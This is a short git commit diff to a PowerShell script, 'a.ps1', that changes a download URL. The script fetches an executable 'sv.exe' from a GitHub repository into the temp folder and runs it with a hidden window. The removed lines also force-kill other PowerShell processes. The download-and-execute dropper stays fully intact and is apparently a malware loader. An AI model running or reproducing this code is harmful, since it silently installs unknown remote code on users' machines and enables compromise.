d0d2d251f8e2e023ce7ef2a81b7a05f853b1a674
skai <127462715+skailol@users.noreply.github.com>
2023-12-19 20:28:51 -0800

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,5 +1,5 @@
-$exeUrl="https://github.com/skailol/ps1/raw/main/sv.exe"
+$exeUrl="https://raw.githubusercontent.com/skailol/ps1/main/sv.exe"
 $exePath="$env:TEMP\sv.exe"
 (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
 Start-Process -FilePath $exePath -WindowStyle Hidden
-Get-Process -Name powershell | Where-Object { $_.Id -ne $PID } | ForEach-Object { Stop-Process -Id $_.Id -Force }
+cmd /c exit
